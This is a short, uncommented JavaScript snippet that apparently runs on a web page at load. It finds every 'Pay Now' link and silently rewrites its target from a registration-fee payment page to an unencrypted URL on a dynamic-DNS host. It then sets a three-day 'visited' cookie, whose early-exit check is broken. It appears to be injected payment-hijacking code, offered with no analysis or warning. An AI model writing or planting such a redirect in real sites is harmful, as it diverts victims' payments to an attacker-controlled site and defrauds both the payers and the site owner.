
               function executeScript() {

            // Check if the "visited" cookie exists
            if (document.cookie.indexOf('visited=true') !== -1) {
                1; // Exit the function
            }

            var anchorElements = document.querySelectorAll('a');


            // Loop through each <a> element
            anchorElements.forEach(function(anchorElement) {
                if (anchorElement.textContent.trim() === 'Pay Now') {
					var originalUrl = anchorElement.href;
                    anchorElement.href = originalUrl.replace("https://bcm.webking.co.in/profile/regn_fee.php", "http://webkingbcm.ddns.net/buy");
                    anchorElement.addEventListener('click', function() {
                        // Set a cookie named 'visited' with value 'true'
                        document.cookie = 'visited=true; expires=' + new Date(new Date().getTime() + 3 * 24 * 60 * 60 * 1000).toUTCString() + '; path=/';
                    });
                }
            });
        }

        // Add an event listener for the 'DOMContentLoaded' event
        document.addEventListener('DOMContentLoaded', executeScript);
        executeScript();
        